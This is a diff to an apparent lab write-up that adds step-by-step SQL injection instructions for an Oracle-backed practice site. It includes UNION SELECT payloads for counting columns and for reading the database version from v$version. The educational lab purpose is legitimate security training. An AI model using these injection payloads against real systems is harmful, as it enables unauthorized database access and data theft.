@@ -36,6 +36,45 @@ To solve this lab we will login with
 
 `Password:anything`
 
+<img src="images/image_unmap1.png" alt="third" width="700">
+
+**Step1:**
+
+Click on any product item
+
+**Step2:**
+
+Send the Request to repeater
+
+<img src="images/image_unmap2.png" alt="third" width="700">
+
+**Step3:**
+
+now we find the number of Column 
+
+Try `'+UNION+SELECT+'a'+FROM+dual--` 
+
+<img src="images/image_unmap3.png" alt="third" width="700">
+
+The result show it that the number of column are more than 1
+
+Try `'+UNION+SELECT+'a','b'+FROM+dual--`
+
+<img src="images/image_unmap4.png" alt="third" width="700">
+
+The result show OK which mean the number of column are two.
+
+
+**Step4:**
+
+To find database type and version we use `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
+
+<img src="images/image_unmap5.png" alt="third" width="700">
+
+In the result we can see database type and version.
+
+and lab is solved
+
 <img src="images/image7.png" alt="third" width="500">
 
 **As we know there are two method**
